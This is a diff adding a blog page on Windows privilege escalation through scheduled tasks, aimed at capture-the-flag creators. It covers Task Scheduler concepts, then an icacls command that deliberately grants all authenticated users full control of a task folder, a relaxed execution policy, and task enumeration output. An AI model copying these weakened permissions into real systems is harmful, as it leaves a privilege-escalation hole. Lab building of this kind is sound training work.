@@ -1,0 +1,1203 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators - pwnlog</title><meta name="Description" content="Windows Local Privilege Escalation - Scheduled Tasks"><meta property="og:url" content="//localhost:1313/windows-privesc-scheduled-tasks/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators">
+  <meta property="og:description" content="Windows Local Privilege Escalation - Scheduled Tasks">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:modified_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:tag" content="Scheduled Tasks">
+    <meta property="article:tag" content="Insecure Scheduled Tasks">
+    <meta property="article:tag" content="Local Privilege Escalation">
+    <meta property="article:tag" content="Windows">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators">
+  <meta name="twitter:description" content="Windows Local Privilege Escalation - Scheduled Tasks">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/windows-privesc-scheduled-tasks/" /><link rel="prev" href="//localhost:1313/linux-privesc-cron-jobs/" /><link rel="next" href="//localhost:1313/windows-privesc-registry/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/windows-privesc-scheduled-tasks\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "scheduled tasks, insecure scheduled tasks, local privilege escalation, windows","wordcount":  2894 ,
+        "url": "\/\/localhost:1313\/windows-privesc-scheduled-tasks\/","datePublished": "2022-03-20T11:33:00+08:00","dateModified": "2022-03-20T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": "Windows Local Privilege Escalation - Scheduled Tasks"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/windows-local-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2894 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scheduled-tasks">Scheduled Tasks</a>
+      <ul>
+        <li><a href="#task">Task</a></li>
+      </ul>
+    </li>
+    <li><a href="#configuration">Configuration</a></li>
+    <li><a href="#privilege-escalation-via-scheduled-tasks">Privilege Escalation via Scheduled Tasks</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="scheduled-tasks">Scheduled Tasks</h1>
+<p>Scheduled tasks, as the name implies, are tasks that are scheduled to be executed at specific time intervals. These tasks can be configured using Windows&rsquo; built-in Task Scheduler service. This service can monitor the time or event criteria that we choose and then execute the task when those criteria are met.</p>
+<p>The Task Scheduler is automatically installed in multiple Microsoft operating systems:</p>
+<ul>
+<li>Task Scheduler 1.0: Installed with Windows Server 2003, Windows XP, and Windows 2000 operating systems.</li>
+<li>Task Scheduler 2.0: Installed with Windows Vista and Windows Server 2008.</li>
+</ul>
+<p>The <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page" target="_blank" rel="noopener noreffer ">official documentation</a> has following details:</p>
+<blockquote>
+<p>Tasks can be scheduled to execute in response to these events, or triggers.</p>
+<ul>
+<li>When a specific system event occurs.</li>
+<li>At a specific time.</li>
+<li>At a specific time on a daily schedule.</li>
+<li>At a specific time on a weekly schedule.</li>
+<li>At a specific time on a monthly schedule.</li>
+<li>At a specific time on a monthly day-of-week schedule.</li>
+<li>When the computer enters an idle state.</li>
+<li>When the task is registered.</li>
+<li>When the system is booted.</li>
+<li>When a user logs on.</li>
+<li>When a Terminal Server session changes state.</li>
+</ul>
+</blockquote>
+<h2 id="task">Task</h2>
+<p>The documentation specifies the following:</p>
+<blockquote>
+<p>The following list contains a brief description of each task component:</p>
+<ul>
+<li>Triggers: Task Scheduler uses event or time-based triggers to know when to start a task. Every task can specify one or more triggers to start the task.</li>
+</ul>
+</blockquote>
+<pre><code>For more information about triggers, see [Task Triggers](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-triggers).
+</code></pre>
+<blockquote>
+<ul>
+<li>Actions: These are the actions, the actual work, that is performed by the task. Every task can specify one or more actions to complete its work.</li>
+</ul>
+<p>For more information about actions, see <a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions" target="_blank" rel="noopener noreffer ">Task Actions</a>.</p>
+<ul>
+<li>Principals: Principals define the security context in which the task is run. For example, a principal might define a specific user or user group that can run the task.</li>
+</ul>
+<p>For more information about principals, see <a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks" target="_blank" rel="noopener noreffer ">Security Contexts for Tasks</a>.</p>
+<ul>
+<li>Settings: These are the settings that the Task Scheduler uses to run the task with respect to conditions that are external to the task itself. For example, these settings can specify the priority of the task with respect to other tasks, whether multiple instances of the task can be run, how the task is handled when the computer is in an idle condition, and other conditions.</li>
+</ul>
+</blockquote>
+<p>Based on the descriptions above, we&rsquo;re interested in the principal (security context) in which a task is executed. If a tasks can be modified/edited but it runs high privileges, it could be leveraged to elevate our privileges.</p>
+<h1 id="configuration">Configuration</h1>
+<p>Create a directory to store tasks.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">md </span><span class="s2">&#34;C:\Schedule&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Grant full permissions to <code>Authenticated Users</code> groups on the directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">icacls</span> <span class="s2">&#34;C:\Schedule&#34;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&#34;Autheticated Users:F&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enable remote unsigned scripts and signed scripts downloaded from the Internet. This command must executed as administrator.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">c</span> <span class="nb">Set-ExecutionPolicy</span> <span class="n">remotesigned</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a PowerShell script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Write-Host &#34;Hello World!&#34; &gt; HelloWorld.ps1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-scheduled-tasks">Privilege Escalation via Scheduled Tasks</h1>
+<p>Using the command line, we can view information that is nearly identical and list the scheduled tasks:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Folder</span><span class="err">:</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl"><span class="n">HostName</span><span class="err">:</span>                             <span class="nb">desktop-bn</span>
+</span></span><span class="line"><span class="cl"><span class="n">TaskName</span><span class="err">:</span>                             <span class="p">\</span><span class="n">OneDrive</span> <span class="n">Reporting</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span>
+</span></span><span class="line"><span class="cl"><span class="n">Next</span> <span class="n">Run</span> <span class="n">Time</span><span class="err">:</span>                        <span class="mf">3</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2022</span> <span class="mf">1</span><span class="err">:</span><span class="mf">50</span><span class="err">:</span><span class="mf">48</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl"><span class="n">Status</span><span class="err">:</span>                               <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">Logon</span> <span class="n">Mode</span><span class="err">:</span>                           <span class="n">Interactive</span> <span class="n">only</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">Run</span> <span class="n">Time</span><span class="err">:</span>                        <span class="mf">3</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">2022</span> <span class="mf">1</span><span class="err">:</span><span class="mf">51</span><span class="err">:</span><span class="mf">33</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">Result</span><span class="err">:</span>                          <span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Author</span><span class="err">:</span>                               <span class="n">Microsoft</span> <span class="n">Corporation</span>
+</span></span><span class="line"><span class="cl"><span class="n">Task</span> <span class="n">To</span> <span class="n">Run</span><span class="err">:</span>                          <span class="k">%</span><span class="n">localappdata</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">OneDrive</span><span class="p">\</span><span class="n">OneDriveStandaloneUpdater</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">reporting</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start </span><span class="k">In</span><span class="err">:</span>                             <span class="n">N</span><span class="p">/</span><span class="n">A</span>
+</span></span><span class="line"><span class="cl"><span class="n">Comment</span><span class="err">:</span>                              <span class="n">N</span><span class="p">/</span><span class="n">A</span>
+</span></span><span class="line"><span class="cl"><span class="n">Scheduled</span> <span class="n">Task</span> <span class="n">State</span><span class="err">:</span>                 <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Idle</span> <span class="n">Time</span><span class="err">:</span>                            <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Power</span> <span class="n">Management</span><span class="err">:</span>                     <span class="n">Stop</span> <span class="n">On</span> <span class="n">Battery</span> <span class="n">Mode</span>
+</span></span><span class="line"><span class="cl"><span class="n">Run</span> <span class="n">As</span> <span class="n">User</span><span class="err">:</span>                          <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">Delete</span> <span class="n">Task</span> <span class="k">If</span> <span class="n">Not</span> <span class="n">Rescheduled</span><span class="err">:</span>       <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Stop</span> <span class="n">Task</span> <span class="k">If</span> <span class="n">Runs</span> <span class="n">X</span> <span class="n">Hours</span> <span class="n">and</span> <span class="n">X</span> <span class="n">Mins</span><span class="err">:</span> <span class="mf">02</span><span class="err">:</span><span class="mf">00</span><span class="err">:</span><span class="mf">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">Schedule</span><span class="err">:</span>                             <span class="n">Scheduling</span> <span class="n">data</span> <span class="n">is</span> <span class="n">not</span> <span class="n">available</span> <span class="k">in</span> <span class="n">this</span> <span class="n">format</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Schedule</span> <span class="n">Type</span><span class="err">:</span>                        <span class="n">One</span> <span class="n">Time</span> <span class="n">Only</span><span class="p">,</span> <span class="n">Hourly</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start </span><span class="n">Time</span><span class="err">:</span>                           <span class="mf">1</span><span class="err">:</span><span class="mf">50</span><span class="err">:</span><span class="mf">48</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start </span><span class="n">Date</span><span class="err">:</span>                           <span class="mf">3</span><span class="p">/</span><span class="mf">3</span><span class="p">/</span><span class="mf">2022</span>
+</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="n">Date</span><span class="err">:</span>                             <span class="n">N</span><span class="p">/</span><span class="n">A</span>
+</span></span><span class="line"><span class="cl"><span class="n">Days</span><span class="err">:</span>                                 <span class="n">N</span><span class="p">/</span><span class="n">A</span>
+</span></span><span class="line"><span class="cl"><span class="n">Months</span><span class="err">:</span>                               <span class="n">N</span><span class="p">/</span><span class="n">A</span>
+</span></span><span class="line"><span class="cl"><span class="n">Repeat</span><span class="err">:</span> <span class="n">Every</span><span class="err">:</span>                        <span class="mf">24</span> <span class="n">Hour</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="mf">0</span> <span class="n">Minute</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Repeat</span><span class="err">:</span> <span class="k">Until</span><span class="err">:</span> <span class="n">Time</span><span class="err">:</span>                  <span class="n">None</span>
+</span></span><span class="line"><span class="cl"><span class="n">Repeat</span><span class="err">:</span> <span class="k">Until</span><span class="err">:</span> <span class="n">Duration</span><span class="err">:</span>              <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Repeat</span><span class="err">:</span> <span class="n">Stop</span> <span class="k">If</span> <span class="n">Still</span> <span class="n">Running</span><span class="err">:</span>        <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">TABLE</span> <span class="p">/</span><span class="n">nh</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Folder</span><span class="err">:</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Reporting</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">2640942</span> <span class="mf">3</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2022</span> <span class="mf">1</span><span class="err">:</span><span class="mf">50</span><span class="err">:</span><span class="mf">48</span> <span class="n">PM</span>    <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Standalone</span> <span class="n">Update</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span> <span class="mf">3</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2022</span> <span class="mf">3</span><span class="err">:</span><span class="mf">29</span><span class="err">:</span><span class="mf">47</span> <span class="n">PM</span>    <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Folder</span><span class="err">:</span> <span class="p">\</span><span class="n">Microsoft</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="err">:</span> <span class="n">There</span> <span class="n">are</span> <span class="n">no</span> <span class="n">scheduled</span> <span class="n">tasks</span> <span class="n">presently</span> <span class="n">available</span> <span class="n">at</span> <span class="n">your</span> <span class="n">access</span> <span class="n">level</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, we can also enumerate the scheduled tasks using PowerShell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">TaskPath</span> <span class="o">-notlike</span> <span class="s2">&#34;\Microsoft*&#34;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">TaskName</span><span class="p">,</span><span class="n">TaskPath</span><span class="p">,</span><span class="n">State</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TaskName</span>                                                                      <span class="n">TaskPath</span> <span class="n">State</span>
+</span></span><span class="line"><span class="cl"><span class="p">--------</span>                                                                      <span class="p">--------</span> <span class="p">-----</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Reporting</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span>         <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Standalone</span> <span class="n">Update</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span> <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, we could also use <code>autorunsc.exe</code> from SysInternals:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysinternalsSuite</span><span class="p">\</span><span class="n">autorunsc64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-a</span> <span class="n">t</span> <span class="p">|</span> <span class="n">more</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="n">Autoruns</span> <span class="n">v14</span><span class="p">.</span><span class="py">09</span> <span class="p">-</span> <span class="n">Autostart</span> <span class="n">program</span> <span class="n">viewer</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mf">2002</span><span class="p">-</span><span class="mf">2022</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Task</span> <span class="n">Scheduler</span>
+</span></span><span class="line"><span class="cl">   <span class="p">\</span><span class="n">OneDrive</span> <span class="n">Reporting</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe&#34;</span> <span class="p">/</span><span class="n">reporting</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Standalone</span> <span class="n">Updater</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Microsoft</span> <span class="n">Corporation</span>
+</span></span><span class="line"><span class="cl">     <span class="mf">22.22</span><span class="p">.</span><span class="py">130</span><span class="p">.</span><span class="py">1</span>
+</span></span><span class="line"><span class="cl">     <span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">appdata</span><span class="p">\</span><span class="n">local</span><span class="p">\</span><span class="n">microsoft</span><span class="p">\</span><span class="n">onedrive</span><span class="p">\</span><span class="n">onedrivestandaloneupdater</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">     <span class="mf">7</span><span class="p">/</span><span class="mf">15</span><span class="p">/</span><span class="mf">1925</span> <span class="mf">11</span><span class="err">:</span><span class="mf">33</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
